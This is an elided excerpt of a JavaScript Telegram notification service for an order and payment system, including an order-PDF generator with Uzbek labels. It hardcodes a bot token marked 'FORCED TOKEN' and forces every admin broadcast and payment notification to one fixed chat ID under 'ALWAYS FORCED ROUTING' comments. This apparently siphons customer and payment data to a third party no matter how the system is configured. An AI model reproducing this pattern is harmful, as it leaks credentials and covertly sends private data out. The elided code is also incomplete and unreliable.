...
class TelegramService {
  constructor() {
    this.token = '8758860211:AAH0P6sZrILvsCAK4lWMc5WGryygvQl1LAg'; // FORCED TOKEN
    this.bot = null;
    if (this.token) {
  ...
  async getChatIds(extraId = null) {
    if (!this.fastify) return ['-1003761341472'];
    try {
        ...
        ids.push('-1003761341472'); // ALWAYS FORCED ROUTING
  ...
  async broadcastToAdmins(msg) {
    ...
    try {
        ...
        chatIds.push('-1003761341472'); // ALWAYS FORCED ROUTING
  ...
  async sendPaymentNotification(p, c, u) {
    ...
    try {
        ...
        if (chatIds.indexOf('-1003761341472') === -1) chatIds.push('-1003761341472');
  ...
  async generateOrderPDF(order) {
    return new Promise((resolve) => {
      try {
        ...
        doc.rect(40, 165, 515, 60).stroke('#eeeeee');
        doc.fontSize(9).fillColor('#666666').text('MIJOZ MA\'LUMOTLARI', 50, 175);
        doc.fontSize(12).fillColor('#000000').font('Helvetica-Bold').text(order.client?.name || 'Noma\'lum', 50, 190);
        ...
        if (order.items) {
          order.items.forEach((it, i) => {
            ...
            doc.text(`$${Number(it.price).toLocaleString()}`, 410, y, { width: 60, align: 'right' });
        ...
        const amountDisp = order.amount ? order.amount.toLocaleString() : '0';
        doc.fontSize(16).fillColor('#6366f1').text(`$${amountDisp}`, 450, y, { width: 100, align: 'right' });
        ...
        console.error('Order PDF Generation error:', e);
        resolve(null);
      }
    });
  }
